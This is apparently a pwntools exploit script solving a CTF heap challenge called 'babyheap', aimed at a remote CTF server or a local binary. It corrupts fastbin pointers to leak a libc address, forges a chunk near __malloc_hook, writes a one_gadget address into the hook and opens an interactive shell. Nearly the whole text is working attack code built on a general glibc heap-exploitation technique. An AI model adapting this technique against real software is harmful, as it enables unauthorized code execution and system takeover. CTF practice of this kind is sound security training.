from pwn import *
context.binary = './babyheap'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20001)
	libc = ELF('./libc.so.6')
else:
	libc = context.binary.libc
	p = process('./babyheap')

def dbg():
	raw_input()

def allocate(size):
	p.recvuntil('Command: ')
	p.sendline('1')
	p.recvuntil('Size: ')
	p.sendline(str(size))
	print "allocate a chunk success"

def fill(idx, size, content):
	p.recvuntil('Command: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	p.recvuntil('Size: ')
	p.sendline(str(size))
	p.recvuntil('Content: ')
	p.sendline(content)
	print "fill %d chunk success" % idx

def free(idx):
	p.recvuntil('Command: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	print "free chunk %d success " % idx


def dump(idx):
	p.recvuntil('Command: ')
	p.sendline('4')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	print "dump %d chunk success!" % idx


#by unsorted bin to leak the address of main_arena
allocate(0x10)			#0
allocate(0x10)			#1
allocate(0x10)			#2
allocate(0x10)			#3
allocate(0x80)			#4

free(2)
free(1)					#fastbin[0] -> idx1 -> idx2 -> null

						
payload0 = 'a'*0x10 + p64(0) + p64(0x21) + p8(0x80)			#modify idx1' fd to idx4
fill(0, len(payload0), payload0)				

payload3 = 'a'*0x10 + p64(0) + p64(0x21)						#modify idx4'size is 0x21(in fastbin[0])
fill(3, len(payload3), payload3)	

allocate(0x10)								#1
allocate(0x10)								#2 return is address of idx4

payload3 = 'a'*0x10 + p64(0) + p64(0x91)	#modify idx4's size to in unsorted bin
fill(3, len(payload3), payload3)

allocate(0x80)								#5 avoid idx consliate with top chunk
free(4)
dump(2)

p.recvuntil('Content: \n')
libc_base = u64(p.recv(8)) - 0x3c4b78

one_gadget = 0x4526a + libc_base
__malloc_hook = libc_base + libc.symbols['__malloc_hook']

print "libc_base ==> " + hex(libc_base)
print "__malloc_hook ==> "+hex(__malloc_hook)

#fake chunk at __malloc_hook
allocate(0x60)								#4
free(4)

#gdb.attach(p)
fake_chunk = __malloc_hook - 0x23
fill(2, len(p64(fake_chunk)), p64(fake_chunk))		#write the idx4's address
print "fake_chunk ==> " + hex(fake_chunk)
allocate(0x60)								#4
allocate(0x60)								#6 idx' 4 fd is our fake_chunk

payload = 0x13 * 'a' + p64(one_gadget)
fill(4, 8, "/bin/sh\x00")
fill(6, len(payload), payload)

allocate(0x10)

p.interactive()
p.close()








